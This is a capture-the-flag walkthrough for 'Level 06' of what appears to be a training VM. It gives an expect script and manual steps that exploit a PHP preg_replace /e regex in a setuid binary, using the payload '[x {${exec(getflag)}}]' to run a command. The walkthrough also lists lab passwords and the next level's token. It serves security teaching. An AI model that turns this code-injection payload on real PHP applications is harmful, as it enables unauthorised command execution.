# Level 06
- In the shell of your choice run the script attached or follow the steps bellow using your VM IP address to get the flag, also root privileges and some dependencies may be needed to install before
	```sh
	$ chmod u+x script.sh
	$ ./script.sh
	$ cat script.sh
	#!/usr/bin/expect -f
	set ip 192.168.1.103
	spawn ssh -o "StrictHostKeyChecking no" level06@$ip -p 4242 "mkdir -p /tmp/level06 ; cd /tmp/level06 ; chmod 777 . ; echo '\[x \{\$\{exec\(getflag\)\}\}\]' > flag ; ~/level06 /tmp/level06/flag"
	expect "sword:"
	send "viuaaale9huek52boumoomioc\r"
	interact
	```
- List content of the home directory
	```sh
	$ ls -l
	```
- Run the file `level06`
	```sh
	$ ./level06
	```
- View the content of the file `level06.php`
	```sh
	$ cat level06.php
	```
- Make a directory in `/tmp` location
	```sh
	$ mkdir -p /tmp/level06
	$ chmod 777 /tmp/level06
	```
- Create a file in that directory with `getflag` exploit for regexp function in php script
	```sh
	$ echo "[x {\${exec(getflag)}}]" > /tmp/level06/flag
	```
- Run the file `level06` with an argument of previously created exploit
	```sh
	$ ./level06 /tmp/level06/flag
	```
- With the token provided `wiok45aaoguiboiki2tuin6ub` switch to the next user level
	```sh
	$ su level07
	Password: wiok45aaoguiboiki2tuin6ub
	``` 
